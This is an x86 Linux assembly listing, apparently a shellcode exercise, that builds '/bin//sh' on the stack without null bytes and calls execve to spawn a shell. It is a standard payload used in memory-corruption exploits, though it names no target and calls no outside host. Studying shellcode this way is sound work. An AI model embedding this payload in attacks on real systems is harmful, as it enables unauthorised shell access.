global _start

section .text

_start:
    ; Zeroes registers eax to edx
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
   
    ; [STACK] = '/bin//sh' -> 0x00000000 
    push eax        ; \x00
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin

    mov ebx, esp    ; ebx - /bin/sh\x00
   
    ; [STACK] = ADDR of '/bin/sh' -> 0x00000000 -> '/bin//sh' -> 0x00000000 
    push eax        ; \x00
    push ebx        ; Address containing the location of '/bin//sh'

    mov al, 0xB     ; Syscall # for execve()
    int 0x80        ; Calls kernel

exit:
    xor eax, eax    
    mov al, 0x1     ; Syscall # for exit()

    xor ebx, ebx
    mov bl, 0xFF    ; Exit code

    int 0x80        ; Calls kernel
